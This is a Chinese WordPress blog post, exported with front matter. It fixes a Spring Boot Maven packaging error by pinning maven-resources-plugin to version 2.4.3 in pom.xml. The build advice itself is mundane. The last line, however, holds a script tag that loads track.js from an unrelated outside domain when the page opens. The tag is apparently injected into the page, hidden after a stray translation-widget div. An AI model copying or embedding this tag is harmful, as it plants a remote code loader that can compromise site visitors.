---
id: 150
title: 'springboot打包错误：Failed to execute goal org.apache.maven.plugins:maven-resources-plugin:3.2.0'
date: '2021-05-01T08:11:55+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=150'
permalink: /index.php/2021/05/01/springboot%e6%89%93%e5%8c%85%e9%94%99%e8%af%af%ef%bc%9afailed-to-execute-goal-org-apache-maven-pluginsmaven-resources-plugin3-2-0/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Oracle
---

解决方法：修改maven-resources-plugin的版本

<build>  
<plugins>  
<plugin>  
<groupId>org.springframework.boot</groupId>  
<artifactId>spring-boot-maven-plugin</artifactId>  
</plugin>

\<!--在这里修改版本-->  
<plugin>  
<groupId>org.apache.maven.plugins</groupId>  
<artifactId>maven-resources-plugin</artifactId>  
<version>2.4.3</version>  
</plugin>  
\<!---->

</plugins>  
</build>

<div id="gtx-trans" style="position: absolute; left: 115px; top: 46px;"><div class="gtx-trans-icon"></div></div><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>